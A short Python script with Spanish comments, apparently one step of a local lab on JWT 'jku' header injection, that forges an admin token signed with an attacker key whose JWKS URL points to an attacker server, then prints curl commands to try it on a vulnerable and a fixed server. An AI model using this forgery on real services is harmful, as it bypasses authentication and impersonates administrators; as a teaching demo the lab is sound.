"""
Paso 3 del ataque: forjar el token malicioso.

- payload: {"user": "admin"}   -> nos hacemos pasar por admin
- header:  incluye `jku` apuntando al JWKS del atacante
- firma:   con la clave PRIVADA del atacante

El servidor vulnerable leera el `jku`, bajara la clave publica del atacante
(que si matchea esta firma) y aceptara el token como valido.
"""
import os

import jwt

AQUI = os.path.dirname(os.path.abspath(__file__))

JKU_URL = "http://localhost:9000/jwks.json"

with open(os.path.join(AQUI, "atacante_private.pem"), "rb") as f:
    priv_pem = f.read()

token = jwt.encode(
    {"user": "admin"},
    priv_pem,
    algorithm="RS256",
    headers={"jku": JKU_URL, "kid": "atacante-key-1"},
)

print("Token forjado (user=admin, jku=%s):\n" % JKU_URL)
print(token)
print("\nProbalo contra el servidor VULNERABLE:")
print('  curl -s http://localhost:5000/inbox -H "Authorization: Bearer %s"' % token)
print("\nY contra el CORREGIDO (deberia fallar):")
print('  curl -s http://localhost:5001/inbox -H "Authorization: Bearer %s"' % token)
